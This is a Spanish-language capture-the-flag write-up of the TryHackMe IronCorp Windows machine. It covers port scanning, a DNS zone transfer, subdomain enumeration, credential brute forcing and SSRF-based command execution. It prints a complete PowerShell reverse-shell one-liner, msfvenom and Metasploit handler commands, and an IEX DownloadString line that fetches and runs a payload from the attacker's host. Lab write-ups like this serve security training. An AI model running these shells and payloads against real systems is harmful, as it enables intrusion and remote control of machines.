---
title: IronCorp - THM
layout: post
permalink: /writeups/THM/ironcorp
date: 2025-02-02 11:00:00 -0000
categories: [TryHackMe]
tags: [Windows, TryHackMe, SSRF, Gobuster, Meterpreter, PowerShell]
image:
  path: /assets/img/writeups/tryhackme/ironcorp-thm/cabecera.png
  alt: Iron Corp
  caption: 
description: >
  Write Up Iron Corp - TryHackMe
pin: false  
toc: true   
math: false 
mermaid: false 
---

# Escanep de puertos

```bash
❯ nmap -p- -sCV --min-rate 5000 -n -Pn ironcorp.me
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-02 18:06 CET
Nmap scan report for ironcorp.me (10.10.222.73)
Host is up (0.082s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-8VMBKF3G815
| Not valid before: 2025-02-01T16:12:40
|_Not valid after:  2025-08-03T16:12:40
| rdp-ntlm-info: 
|   Target_Name: WIN-8VMBKF3G815
|   NetBIOS_Domain_Name: WIN-8VMBKF3G815
|   NetBIOS_Computer_Name: WIN-8VMBKF3G815
|   DNS_Domain_Name: WIN-8VMBKF3G815
|   DNS_Computer_Name: WIN-8VMBKF3G815
|   Product_Version: 10.0.14393
|_  System_Time: 2025-02-02T17:07:37+00:00
|_ssl-date: 2025-02-02T17:07:45+00:00; 0s from scanner time.
8080/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
11025/tcp open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
|_http-title: Coming Soon - Start Bootstrap Theme
| http-methods: 
|_  Potentially risky methods: TRACE
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Analizando el resultado del escaneo Nmap, hay varios puntos interesantes:

1. DNS (Puerto 53):


   -  Está corriendo Simple DNS Plus, lo que significa que este servidor está gestionando resolución de nombres
   -  Los servidores DNS a veces pueden ser vulnerables a ataques como zone transfers o DNS cache poisoning

2. RPC (Puerto 135):

   -  Está corriendo Microsoft Windows RPC, lo que significa que este servidor está gestionando servicios remotos
   -  Este puerto puede exponer información sobre el sistema y potencialmente ser vulnerable

3. RDP (Puerto 3389):

   -  Terminal Services está activo, permitiendo conexiones remotas
   -  Podría ser un vector de ataque mediante fuerza bruta o explotación de vulnerabilidades conocidas

4. Web Server (Puerto 8080):

   -  Microsoft IIS 10.0

   -  Podríamos:
      - Buscar directorios ocultos
      - Verificar archivos de configuración mal configurados
      - Comprobar vulnerabilidades específicas de IIS 10.0

6. Puerto 11025:

   -  Apache httpd 2.4.41
   -  PHP 7.4.4
   -  OpenSSL 1.1.1c
   -  Título "Coming Soon - Start Bootstrap Theme"
   -  Este es especialmente interesante porque es una configuración Apache+PHP diferente al IIS del puerto 8080

7. Información adicional del sistema:

   -  Windows Server (Product_Version: 10.0.14393)
   -  Nombre del host: WIN-8VMBKF3G815

# Investignado servicios HTTP

Por lo que parece ambos servicios son pruebas de aplicaciones web.

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image.png)

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-1.png)

# Investigando el servicio DNS

Intentamos enumerar los nombres de dominio que están registrados en el servidor DNS.

```bash
❯ dnsenum ironcorp.me
dnsenum VERSION:1.3.1

-----   ironcorp.me   -----


Host's addresses:
__________________



Name Servers:
______________

 ironcorp.me NS record query failed: NXDOMAIN
 ```

 Nada interesante pero vamos a intentar realizar una transferencia de zona.

 > Una transferencia de zona DNS es el proceso en el cual se copian o transfieren los registros DNS completos de un servidor DNS a otro. 
{: .prompt-info }

```bash
❯ dig axfr @10.10.222.73 ironcorp.me

; <<>> DiG 9.20.4-4-Debian <<>> axfr @10.10.222.73 ironcorp.me
; (1 server found)
;; global options: +cmd
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
ironcorp.me.		3600	IN	NS	win-8vmbkf3g815.
admin.ironcorp.me.	3600	IN	A	127.0.0.1
internal.ironcorp.me.	3600	IN	A	127.0.0.1
ironcorp.me.		3600	IN	SOA	win-8vmbkf3g815. hostmaster. 3 900 600 86400 3600
;; Query time: 559 msec
;; SERVER: 10.10.222.73#53(10.10.222.73) (TCP)
;; WHEN: Sun Feb 02 17:41:53 CET 2025
;; XFR size: 5 records (messages 1, bytes 238)
```

## Mediante Gobuster

Podemos utilizar Gobuster para buscar subdominios.

```bash
❯ gobuster dns -d ironcorp.me -r 10.10.222.73:53 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     ironcorp.me
[+] Threads:    10
[+] Resolver:   10.10.222.73:53
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: admin.ironcorp.me

Found: internal.ironcorp.me

Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

Ahora que tenemos los nombres de los subdominios podemos agregarlso a nuestro archivo `/etc/hosts` para que nuestro sistema pueda resolverlos.

```bash
❯ echo "10.10.222.73 ironcorp.me admin.ironcorp.me internal.ironcorp.me" >> /etc/hosts
```


# Revisintando los servicios HTTP

Ahora que tenemos el subdominio de ironcorp.me podemos revisar los servicios HTTP que están expuestos.

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-5.png)

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-2.png)

Visitando el subdonmino admin.ironcorp.me parece haber un panel de administración protegido por crendeciales.

### Ataque de fuerza bruta

Visto el tipo de autenticación que está utilizando podemos intetar un ataque de fuerza bruta, en este caso mediante el uso de `hydra`.

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-3.png)

Como vemos no ha tardado demasiado.

La pagina parece bastante sencilla y el buscador no parece ser de mucha utilidad ahroa mismo pero, si nos fijamos en el parámetro que se le está pasando parece que si está intentando acceder a algún recurso.

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-4.png)

Parece que hace puede hacer peticiones a recursos. Podemos aprovechar esto para intentar realizar LFI, RFI o SSRF.

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-6.png)

Recordando la anterior página del dominio internal.ironcorp.me donde no teniamos autenticación, podemos intentar realizar la petición para ver que se devuelve.

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-7.png)

Para hacerlo más sencillo siempre es bueno tener un proxy en el que podamos visualizar el rastro de las peticiones realizadas.

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-8.png)

Parece que la aplicación web servida en internal.ironcorp.me está sirviendo una url donde puedes comprobar el nombre de usuario que lo está utilizando.

Vamos a comprobar entonces que usuario es el administrador con el que nos hemos autenticado en admin.ironcorp.me.

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-9.png)

Parece que el usuario es llamado "Equinox".
Sabiendo esto podríamos pensar que está ejecuntando alguna comprobación para saber el usuario y, al ser el usuario que nos muestra diferente al que hemos utilizado para autenticanos podemos deducir que el lugar o servicio donde está comprobando no es el mismo en el que nos encontramos.

¿Quizás es ejecutado a nivel de sistema?

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-10.png)

Eso parece.


# Ganando acceso

Ahora que sabemos que la barra de busqueda realmente está siendo ejecutada como un usuario en el servidor, no queda otra que crearnos una shell en el sistema.

Para esto hay varias formas pero aquí vamos a hacerlo en un solo paso.

EL one-liner que vamos a utilizar es el siguiente:

```powershell
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.17.92',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
> Esto hay que encodearlo 2 veces debido a que el comando que se está ejecutando es un comando de PowerShell.
{: .prompt-info }

- Primera codificación:

   - Era necesaria para los caracteres especiales en el payload inicial (|, espacios, etc.)
   - Por ejemplo: `|` se convierte en `%7C`

- Segunda codificación:

   - El servidor hacía una petición interna usando el parámetro `r=`
   - El `%` de la primera codificación necesitaba ser codificado de nuevo
   - Por ejemplo: `%7C` se convertía en `%257C`

- La razón técnica es:

   - La primera codificación protege los caracteres especiales del payload
   - La segunda codificación protege los caracteres especiales de la URL interna que el servidor procesa

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-11.png)

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-12.png)

## User flag

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-13.png)

Ya que estamos en un disco secundario hay que navegar a C:\Users\Administrator\Desktop\user.txt

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-14.png)

# Escalando privilegios

Dando una vuelta por el sistema vemos que hay una carpeta de usuario llamada SuperAdmin a la que no tenemos acceso.

Bueno para poder visualizar bien lo que va a ocurrir primero nos dirigimos a la carpeta de este usuario.

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-15.png)

Según la ACL no tenemos acceso al contenido de la carpeta.

Si miramos los privilegios de nuestro usuario.

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-16.png)

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-17.png)

Efectivamente somos administradores del sistema.

La verdad no entendí mucho el concepto de esta CTF pero la idea es que no es necesario que escalemos privilegios. 

No tenemos aceso a la carpeta de SuperAdmin debido a que explicitamente en las ACL se ha indicado que el grupo Administrators hay una denegación explícita (Deny).

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-19.png)

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-18.png)

Bien lo interesante es que el usuario con SID (S-1-5-21-297466380-2647629429-287235700-1000) tiene FullControl sobre la carpeta de SuperAdmin.

Si lo buscamos en el sistema vamos a ver que no existe.

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-20.png)

Resumen:
   - Somos NT AUTHORITY\SYSTEM y no SuperAdmin. 
   - Somos Owner de la carpeta de SuperAdmin.
   - No existe el usuario SuperAdmin en el sistema.

A pesar de haber intentado esacalar a un meterpreter, la situación no cambió y la realidad es que desde el primer punto de entrada hemos podido acceder si no bien la carpeta SuperAdmin pero si a su contenido.

## Root flag

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-21.png)

# Bonus - Escalando Meterpreter

Aunque no es necesario os dejo el proceso de escalar a un meterpreter.

1. Generar el payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.17.92 LPORT=9001 -f psh -o shell.ps1
```

2. Servimos el payload

```bash
python3 -m http.server 80
```
3. En msfconsole necesitamos crear una listener

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.8.17.92
set LPORT 9001
exploit 
```

4. Desde la shell reversa que ya tenemos lo vamos a descargar y ejecutar en un solo comando.

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.8.17.92/shell.ps1')
```

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-22.png)

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-23.png)

Tratando de impersonar al usuario SuperAdmin.

![alt text](/assets/img/writeups/tryhackme/ironcorp-thm/image-24.png)

